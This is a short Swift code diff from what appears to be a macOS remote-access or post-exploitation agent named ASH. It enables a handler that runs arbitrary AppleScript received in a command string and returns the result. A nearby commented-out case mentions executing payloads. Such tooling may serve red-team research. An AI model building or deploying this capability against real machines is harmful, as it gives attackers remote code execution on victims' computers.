@@ -176,14 +176,20 @@ public struct ASH {
                     }
                 }
                 
-//            case ("osascript;"):
-//                let commandSplit = command.components(separatedBy: "; ")[safe: 1]
-//                if commandSplit != nil {
-//                    let source = commandSplit!
-//                    let scriptOutput = NSAppleScript(source: source)!
-//                    var scriptErr: NSDictionary?
-//                    scriptOutput.executeAndReturnError(&scriptErr)
-//                }
+            case ("osascript;"):
+                let commandSplit = command.components(separatedBy: "; ")[safe: 1]
+                if commandSplit != nil {
+                    let source = commandSplit!
+                    let scriptOutput = NSAppleScript(source: source)!
+                    var scriptErr: NSDictionary?
+                    scriptOutput.executeAndReturnError(&scriptErr)
+                    if scriptErr is NSNull {
+                        return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: scriptErr).returnDict as NSDictionary
+                    }
+                    else {
+                        return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: scriptErr).returnDict as NSDictionary
+                    }
+                }
 //            case ("execute;"):
 //            //Will execute payloads, this typically works better when you're in the same directory as the destination payload
 //            let commandSplit = command.components(separatedBy: "; ")[safe: 1]
